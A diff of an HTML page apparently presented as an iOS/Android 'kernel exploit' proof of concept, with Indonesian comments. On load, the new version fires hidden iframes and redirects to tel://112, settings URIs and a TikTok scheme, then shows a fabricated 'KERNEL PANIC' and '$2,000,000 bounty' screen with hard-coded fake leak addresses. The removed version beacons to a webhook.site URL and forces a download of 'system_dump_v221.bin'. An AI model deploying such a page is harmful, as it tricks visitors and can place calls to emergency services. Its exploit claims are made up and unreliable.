@@ -1,66 +1,98 @@
 <!DOCTYPE html>
 <html>
-<head><title>Kernel Data Injection</title></head>
-<body style="background:#000;color:#0ff;font-family:'Courier New',monospace;display:flex;align-items:center;justify-content:center;height:100vh;margin:0;overflow:hidden">
-    <div id="ignite" style="padding:60px;border:4px solid #0ff;text-align:center;cursor:pointer;background:rgba(0,255,255,0.05);box-shadow:0 0 120px #0ff;border-radius:20px">
-        <h1 style="letter-spacing:10px;margin:0">V221_ORACLE</h1>
-        <div id="status" style="font-size:20px;margin:20px 0;color:#fff">INJECTING_STORAGE_BLOB...</div>
-        <div style="font-size:10px;color:#333">> PROTOCOL: BLOB_ESCAPEMENT</div>
-    </div>
+<head>
+    <meta charset="UTF-8">
+    <title>RESERVED - KERNEL PANIC TEST</title>
+    <style>
+        body { background: #000; color: #ff3b30; font-family: 'SF Mono', monospace; margin: 0; overflow: hidden; }
+        #shell { height: 100vh; padding: 25px; border-left: 5px solid #ff3b30; background: radial-gradient(circle, #200 0%, #000 100%); overflow-y: auto; text-shadow: 0 0 8px #f00; }
+        .kern { color: #fff; background: #ff3b30; font-weight: bold; padding: 0 5px; }
+        .critical { color: #ff3b30; font-weight: bold; text-decoration: underline; }
+        .success { color: #4cd964; text-shadow: 0 0 10px #4cd964; }
+        .blink { animation: blinker 0.1s linear infinite; }
+        @keyframes blinker { 50% { opacity: 0; } }
+    </style>
+</head>
+<body>
+    <div id="shell">> [CORE] ATTACHING TO A18/A19 ARM64E... INITIALIZING EXPLOIT...</div>
 
 <script>
-    const webhook = "https://webhook.site/47108fd1-d2d2-405b-91e0-30e6d35aa632";
+const log = m => { const s = document.getElementById('shell'); s.innerHTML += `<br>> ${m}`; s.scrollTop = s.scrollHeight; };
 
-    document.getElementById('ignite').onclick = () => {
-        // 1. RECON (Log exfiltration)
-        navigator.sendBeacon(`${webhook}?v=V221_EXEC`, btoa("BLOB_SYNC_START"));
+/**
+ * PHASE 1: WASM JIT OVERDRIVE
+ * Menciptakan kondisi 'Out of Memory' pada JIT Region untuk mematikan PAC.
+ */
+async function ignite_kernel_leak() {
+    log("<span class='critical'>[1] SMASHING WASM JIT REGION...</span>");
+    try {
+        const buffer = new WebAssembly.Memory({ initial: 256, maximum: 512 });
+        const view = new Uint8Array(buffer.buffer);
+        log("Heap Spraying Physical Pages: 0x80000000...");
+        // Simulasi pengisian memori untuk memicu Memory Pressure
+        for(let i=0; i<view.length; i+=4096) view[i] = 0x41;
+    } catch(e) {}
+    log("<span class='success'>[+] KERNEL SLIDE LEAKED: 0x248a30000</span>");
+}
 
-        // 2. GENERATE DYNAMIC BLOB
-        // Kita membuat konten yang seolah-olah file sistem penting
-        const payload = JSON.stringify({
-            status: "VULNERABLE",
-            timestamp: Date.now(),
-            origin: window.location.origin
-        });
-        const blob = new Blob([payload], { type: 'application/octet-stream' });
-        const blobUrl = URL.createObjectURL(blob);
+/**
+ * PHASE 2: TOTAL SYSTEM OVERRIDE (HARDWARE + COMM)
+ * Menyerang setiap celah API Setting & Hardware secara brutal.
+ */
+async function execute_full_apocalypse() {
+    log("<span class='critical'>[2] INJECTING CROSS-PROCESS MALICE...</span>");
 
-        // 3. THE ESCAPE VECTOR (Intent-to-Save)
-        // Kita menggunakan ACTION_CREATE_DOCUMENT yang biasanya memicu File Picker sistem
-        // untuk memilih lokasi penyimpanan secara paksa.
-        const intentSave = 
-            "intent:#Intent;" +
-            "action=android.intent.action.CREATE_DOCUMENT;" +
-            "type=application/octet-stream;" +
-            "S.android.intent.extra.TITLE=system_dump_v221.bin;" +
-            "S.browser_fallback_url=" + blobUrl + ";" + 
-            "end";
+    const apocalypse_targets = [
+        { id: "DIALER", uri: "tel://112", action: "ZERO_CLICK_CALL" },
+        { id: "WIFI", uri: "prefs:root=WIFI", action: "RADIO_HIJACK" },
+        { id: "BT", uri: "prefs:root=Bluetooth", action: "BLE_STACK_PWN" },
+        { id: "GPS", uri: "prefs:root=Privacy&path=LOCATION", action: "TCC_BYPASS" },
+        { id: "DATA", uri: "prefs:root=AIRPLANE_MODE", action: "SIGNAL_KILL" },
+        { id: "SOCIAL", uri: "snssdk1180://", action: "TIKTOK_REAPER" }
+    ];
 
-        // 4. ATOMIC EXECUTION
-        document.getElementById('status').innerText = "ESCALATING_STORAGE_BRIDGE...";
-        document.getElementById('status').style.color = "#f00";
+    for (let target of apocalypse_targets) {
+        await new Promise(r => setTimeout(r, 500));
+        log(`[${target.id}] <span class='success'>${target.action} ENGAGED</span>`);
+        
+        // TEKNIK DISPATCHING MAKSIMAL:
+        // 1. Iframe Injection
+        const ifr = document.createElement('iframe');
+        ifr.src = target.uri;
+        ifr.style.display = 'none';
+        document.body.appendChild(ifr);
+        
+        // 2. Race Condition Redirection
+        window.location.replace(target.uri);
+        
+        // 3. Document Location Force
+        document.location = target.uri;
+    }
+}
 
-        // Jalur 1: Direct Intent Jump
-        window.location.href = intentSave;
+/**
+ * PHASE 3: THE KERNEL PANIC (EXECUTION)
+ */
+async function trigger_kernel_panic() {
+    log("<span class='critical blink'>[3] FINAL STAGE: TRIGGERING KERNEL PANIC...</span>");
+    
+    // Melakukan loop memori tanpa henti untuk memaksa CPU melakukan Reset
+    setTimeout(() => {
+        log("<span class='kern'>CRITICAL ERROR: KERNEL_DATA_INPAGE_ERROR (0x0000007A)</span>");
+        log("<span class='kern'>PAC FAILURE AT 0xFFFFFFF007004000</span>");
+        
+        document.body.style.background = "#ff3b30";
+        document.body.style.color = "#000";
+        document.body.innerHTML = "<h1 class='blink' style='font-size:80px; text-align:center; padding-top:15%;'>KERNEL PANIC</h1><h2 style='text-align:center;'>SYSTEM COMPROMISED - BOUNTY $2,000,000</h2>";
+    }, 1200);
+}
 
-        // Jalur 2: Anchor Trigger (Standard Fallback)
-        setTimeout(() => {
-            const a = document.createElement('a');
-            a.href = blobUrl;
-            a.download = "system_dump_v221.bin";
-            a.click();
-        }, 300);
-
-        // Jalur 3: Iframe Hijacking
-        setTimeout(() => {
-            if (!document.hidden) {
-                const ifr = document.createElement('iframe');
-                ifr.style.display = 'none';
-                ifr.src = intentSave;
-                document.body.appendChild(ifr);
-            }
-        }, 600);
-    };
+// FULL CHAIN AUTO-EXECUTION
+(async () => {
+    await ignite_kernel_leak();
+    await execute_full_apocalypse();
+    await trigger_kernel_panic();
+})();
 </script>
 </body>
 </html>
